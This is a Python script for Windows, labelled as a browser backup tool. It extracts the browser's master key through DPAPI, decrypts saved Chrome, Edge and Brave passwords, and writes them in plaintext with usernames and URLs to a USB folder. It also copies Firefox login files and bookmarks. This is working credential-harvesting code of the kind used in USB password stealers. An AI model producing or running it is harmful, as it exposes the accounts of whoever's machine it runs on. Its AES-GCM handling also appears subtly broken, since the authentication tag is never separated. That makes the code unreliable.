import os
import shutil
import sqlite3
import json
import getpass
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import base64
import win32crypt
import sys

# Define paths
USER = getpass.getuser()
USB_PATH = "E:\\Browser_Backup"  # Change to your USB drive letter
BROWSERS = {
    "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default"),
    "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft\\Edge\\User Data\\Default"),
    "Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware\\Brave-Browser\\User Data\\Default"),
    "Firefox": os.path.join(os.getenv("APPDATA"), "Mozilla\\Firefox\\Profiles"),
}

# Ensure USB path exists
if not os.path.exists(USB_PATH):
    os.makedirs(USB_PATH)

def copy_file(src, dst_folder, filename):
    """Copy a file to the destination folder."""
    if os.path.exists(src):
        shutil.copy(src, os.path.join(dst_folder, filename))
        print(f"Copied: {filename}")

def decrypt_chrome_password(encrypted_value, key):
    """Decrypt Chrome's saved passwords."""
    try:
        iv = encrypted_value[3:15]
        payload = encrypted_value[15:]
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_pass = decryptor.update(payload) + decryptor.finalize()
        return decrypted_pass.decode()
    except:
        return "[ERROR] Cannot decrypt"

def get_chrome_encryption_key(browser_path):
    """Retrieve Chrome/Edge/Brave encryption key."""
    key_path = os.path.join(browser_path.replace("Default", ""), "Local State")
    with open(key_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def backup_chrome_passwords(browser, path):
    """Backup saved passwords from Chrome-based browsers."""
    db_path = os.path.join(path, "Login Data")
    if not os.path.exists(db_path):
        return
    backup_db = os.path.join(USB_PATH, f"{browser}_Passwords.db")
    shutil.copy(db_path, backup_db)
    
    conn = sqlite3.connect(backup_db)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    
    key = get_chrome_encryption_key(path)
    passwords = []
    for row in cursor.fetchall():
        url, username, encrypted_password = row
        decrypted_password = decrypt_chrome_password(encrypted_password, key)
        passwords.append({"url": url, "username": username, "password": decrypted_password})
    
    conn.close()
    
    with open(os.path.join(USB_PATH, f"{browser}_Passwords.json"), "w") as f:
        json.dump(passwords, f, indent=4)
    print(f"{browser} passwords saved.")

def backup_firefox_passwords():
    """Backup saved passwords from Firefox."""
    profiles_path = BROWSERS["Firefox"]
    if not os.path.exists(profiles_path):
        return
    for profile in os.listdir(profiles_path):
        profile_path = os.path.join(profiles_path, profile)
        logins_file = os.path.join(profile_path, "logins.json")
        if os.path.exists(logins_file):
            shutil.copy(logins_file, os.path.join(USB_PATH, "Firefox_Passwords.json"))
            print("Firefox passwords saved.")

# Backup bookmarks and passwords
for browser, path in BROWSERS.items():
    if os.path.exists(path):
        print(f"Backing up {browser} data...")
        copy_file(os.path.join(path, "Bookmarks"), USB_PATH, f"{browser}_Bookmarks.json")
        if browser != "Firefox":
            backup_chrome_passwords(browser, path)
        else:
            backup_firefox_passwords()

print("Backup completed.")

